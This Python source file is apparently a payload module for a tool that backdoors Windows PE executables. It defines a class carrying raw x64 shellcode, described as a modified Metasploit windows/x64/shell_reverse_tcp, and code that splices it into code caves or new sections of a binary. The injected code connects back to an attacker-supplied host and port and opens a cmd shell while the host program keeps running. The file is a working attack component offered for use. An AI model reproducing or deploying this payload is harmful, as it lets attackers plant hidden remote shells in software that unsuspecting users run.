import struct
import os
import logging
#from core import enum
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from pe.core import eat_code_caves
from common import common

class reverse_tcp_inline_shell():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "reverse_tcp_inline_shell"
        self.description = """Basic reverse_tcp_shell (non-stager) from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')

        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             , 'iso-8859-1')
        self.apis_needed = None
        self.payload_type = 'single'
        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # no encoders
        self.PM.found_encoder = False
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self): #flItms, CavesPicked={}):

        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """

        self.shellcode1 = bytes("\xfc"
                           "\x48\x83\xe4\xf0"
                           "\xe8",'iso-8859-1')

        if self.MODE.lower() == 'cave_jumping':
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        else:
            self.shellcode1 += b"\xc0\x00\x00\x00"

        self.shellcode1 += bytes("\x41\x51\x41\x50\x52"
                            "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            "\x8b\x12\xe9\x57\xff\xff\xff", 'iso-8859-1')

        self.shellcode2 = bytes("\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           "\x49\x89\xe5\x49\xbc\x02\x00", 'iso-8859-1')
        self.shellcode2 += struct.pack('!H', int(self.PORT))
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += bytes("\x41\x54"
                            "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            "\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            "\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            "\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            , 'iso-8859-1')

        
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        # ENCODE HERE
        return self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore
